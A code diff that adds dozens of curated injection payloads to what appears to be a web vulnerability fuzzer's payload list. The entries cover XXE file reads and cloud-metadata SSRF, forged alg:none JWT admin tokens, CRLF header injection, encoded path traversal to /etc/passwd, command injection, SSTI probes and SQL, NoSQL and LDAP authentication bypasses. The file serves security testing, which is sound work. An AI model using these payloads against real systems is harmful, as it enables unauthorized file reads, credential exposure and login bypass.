@@ -89,6 +89,78 @@ export const CURATED_PAYLOADS = [
   // ── XPath Injection ──
   { type: 'xpath_injection', value: "' or '1'='1", source: 'payloadsallthethings', categories: ['AUTH_FIELD', 'SEARCH_FIELD'], tags: ['boolean'] },
   { type: 'xpath_injection', value: "'] | //user/*['", source: 'payloadsallthethings', categories: ['SEARCH_FIELD'], tags: ['node'] },
+
+  // ── XXE (XML External Entity) ──
+  // Fire on XML-accepting endpoints (Content-Type: application/xml | text/xml).
+  // The detector confirms on a reflected entity or a /etc/passwd signature.
+  { type: 'xxe', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'TEXT_FIELD', 'GENERIC'], tags: ['classic', 'file_read', 'unix'] },
+  { type: 'xxe', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'GENERIC'], tags: ['classic', 'file_read', 'windows'] },
+  { type: 'xxe', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'GENERIC'], tags: ['ssrf', 'cloud_metadata'] },
+  { type: 'xxe', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'GENERIC'], tags: ['php_wrapper', 'source_read'] },
+  { type: 'xxe', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'GENERIC'], tags: ['parameter_entity'] },
+  { type: 'xxe', value: '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'FILE_PATH', 'GENERIC'], tags: ['svg', 'file_read'] },
+  { type: 'xxe', value: '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'GENERIC'], tags: ['file_read', 'unix'] },
+  { type: 'xxe', value: '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId></stockCheck>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'GENERIC'], tags: ['classic', 'file_read'] },
+
+  // ── JWT Algorithm Confusion (alg:none) ──
+  // The detector mutates a present JWT to alg:none and replays it; these are
+  // weak-secret probes the fuzzer can also try against HS256 tokens.
+  { type: 'jwt_alg_none', value: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.', source: 'payloadsallthethings', categories: ['AUTH_FIELD', 'TOKEN_FIELD', 'GENERIC'], tags: ['alg_none', 'admin'] },
+  { type: 'jwt_alg_none', value: 'eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.', source: 'payloadsallthethings', categories: ['AUTH_FIELD', 'TOKEN_FIELD', 'GENERIC'], tags: ['alg_None', 'case_variant'] },
+  { type: 'jwt_alg_none', value: 'secret', source: 'payloadsallthethings', categories: ['TOKEN_FIELD'], tags: ['weak_secret', 'hs256'] },
+  { type: 'jwt_alg_none', value: 'password', source: 'payloadsallthethings', categories: ['TOKEN_FIELD'], tags: ['weak_secret', 'hs256'] },
+  { type: 'jwt_alg_none', value: '123456', source: 'payloadsallthethings', categories: ['TOKEN_FIELD'], tags: ['weak_secret', 'hs256'] },
+
+  // ── CRLF Injection / HTTP Response Splitting ──
+  { type: 'crlf_injection', value: '%0d%0aSet-Cookie:smartfuzz=injected', source: 'payloadsallthethings', categories: ['URL_FIELD', 'SEARCH_FIELD', 'GENERIC'], tags: ['url_encoded', 'set_cookie'] },
+  { type: 'crlf_injection', value: '%0d%0aX-Injected-Header:smartfuzz', source: 'payloadsallthethings', categories: ['URL_FIELD', 'GENERIC'], tags: ['url_encoded', 'header'] },
+  { type: 'crlf_injection', value: '\r\nX-Injected-Header: smartfuzz', source: 'payloadsallthethings', categories: ['URL_FIELD', 'GENERIC'], tags: ['raw', 'header'] },
+  { type: 'crlf_injection', value: '%0D%0AX-Injected-Header:smartfuzz', source: 'payloadsallthethings', categories: ['URL_FIELD', 'GENERIC'], tags: ['url_encoded_upper', 'header'] },
+  { type: 'crlf_injection', value: '%E5%98%8A%E5%98%8DX-Injected-Header:smartfuzz', source: 'payloadsallthethings', categories: ['URL_FIELD', 'GENERIC'], tags: ['unicode_bypass', 'header'] },
+  { type: 'crlf_injection', value: '%23%0d%0aX-Injected-Header:smartfuzz', source: 'payloadsallthethings', categories: ['URL_FIELD', 'GENERIC'], tags: ['fragment_prefix', 'header'] },
+
+  // ── Path Traversal / LFI (extended) ──
+  { type: 'path_traversal', value: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', source: 'payloadsallthethings', categories: ['FILE_PATH'], tags: ['lfi', 'double_url_encoded'] },
+  { type: 'path_traversal', value: '..%252f..%252f..%252fetc%252fpasswd', source: 'payloadsallthethings', categories: ['FILE_PATH'], tags: ['lfi', 'double_encoded'] },
+  { type: 'path_traversal', value: '..%c0%af..%c0%af..%c0%afetc/passwd', source: 'payloadsallthethings', categories: ['FILE_PATH'], tags: ['lfi', 'unicode'] },
+  { type: 'path_traversal', value: '..%5c..%5c..%5cwindows%5cwin.ini', source: 'fuzzdb', categories: ['FILE_PATH'], tags: ['lfi', 'windows', 'url_encoded'] },
+  { type: 'path_traversal', value: '/var/www/../../etc/passwd', source: 'fuzzdb', categories: ['FILE_PATH'], tags: ['lfi', 'absolute_traversal'] },
+  { type: 'path_traversal', value: 'file:///etc/passwd', source: 'payloadsallthethings', categories: ['FILE_PATH', 'URL_FIELD'], tags: ['lfi', 'file_scheme'] },
+  { type: 'path_traversal', value: 'php://filter/convert.base64-encode/resource=index.php', source: 'payloadsallthethings', categories: ['FILE_PATH'], tags: ['lfi', 'php_wrapper'] },
+  { type: 'path_traversal', value: '....\\\\....\\\\....\\\\windows\\\\win.ini', source: 'payloadsallthethings', categories: ['FILE_PATH'], tags: ['lfi', 'windows', 'filter_bypass'] },
+
+  // ── Command Injection (extended) ──
+  { type: 'cmd_injection', value: '&& id', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'and'] },
+  { type: 'cmd_injection', value: '|| id', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'or'] },
+  { type: 'cmd_injection', value: '%0aid', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'newline'] },
+  { type: 'cmd_injection', value: '\nid', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'raw_newline'] },
+  { type: 'cmd_injection', value: '; ping -c 1 127.0.0.1', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'time', 'ping'] },
+  { type: 'cmd_injection', value: '&& dir', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['windows', 'and'] },
+  { type: 'cmd_injection', value: '; cat /etc/passwd', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'file_read'] },
+
+  // ── SSTI (per-engine, extended) ──
+  { type: 'ssti', value: '{{config}}', source: 'payloadsallthethings', categories: ['SEARCH_FIELD', 'GENERIC'], tags: ['jinja', 'config_leak'] },
+  { type: 'ssti', value: '{{self._TemplateReference__context}}', source: 'payloadsallthethings', categories: ['GENERIC'], tags: ['twig'] },
+  { type: 'ssti', value: '#set($x=7*7)${x}', source: 'payloadsallthethings', categories: ['GENERIC'], tags: ['velocity'] },
+  { type: 'ssti', value: '${{7*7}}', source: 'payloadsallthethings', categories: ['GENERIC'], tags: ['probe', 'polyglot2'] },
+  { type: 'ssti', value: '@(7*7)', source: 'payloadsallthethings', categories: ['GENERIC'], tags: ['razor'] },
+  { type: 'ssti', value: '{{7*\'7\'}}', source: 'payloadsallthethings', categories: ['GENERIC'], tags: ['jinja', 'string_mult'] },
+
+  // ── Auth bypass (dedicated) ──
+  { type: 'sqli', value: "admin' OR '1'='1'--", source: 'seclists', categories: ['AUTH_FIELD'], tags: ['auth_bypass', 'comment'] },
+  { type: 'sqli', value: "admin'/*", source: 'seclists', categories: ['AUTH_FIELD'], tags: ['auth_bypass', 'comment'] },
+  { type: 'sqli', value: "' OR 1=1 LIMIT 1--", source: 'seclists', categories: ['AUTH_FIELD'], tags: ['auth_bypass', 'limit'] },
+  { type: 'sqli', value: '") OR ("1"="1', source: 'seclists', categories: ['AUTH_FIELD'], tags: ['auth_bypass', 'paren'] },
+
+  // ── NoSQL Injection (extended) ──
+  { type: 'nosql_injection', value: '{"$where":"1==1"}', source: 'payloadsallthethings', categories: ['SEARCH_FIELD', 'GENERIC'], tags: ['mongo', 'where'] },
+  { type: 'nosql_injection', value: '{"$regex":".*"}', source: 'payloadsallthethings', categories: ['AUTH_FIELD', 'SEARCH_FIELD'], tags: ['mongo', 'regex'] },
+  { type: 'nosql_injection', value: '{"$gt":"", "$lt":"~"}', source: 'payloadsallthethings', categories: ['SEARCH_FIELD'], tags: ['mongo', 'range'] },
+
+  // ── LDAP Injection (extended) ──
+  { type: 'ldap_injection', value: ')(cn=*))(|(cn=*', source: 'payloadsallthethings', categories: ['AUTH_FIELD'], tags: ['filter', 'or'] },
+  { type: 'ldap_injection', value: '*)(objectClass=*', source: 'payloadsallthethings', categories: ['AUTH_FIELD', 'SEARCH_FIELD'], tags: ['filter', 'enumerate'] },
+  { type: 'ldap_injection', value: 'admin)(&(password=*', source: 'payloadsallthethings', categories: ['AUTH_FIELD'], tags: ['filter', 'auth_bypass'] },
 ];
 
 export default CURATED_PAYLOADS;
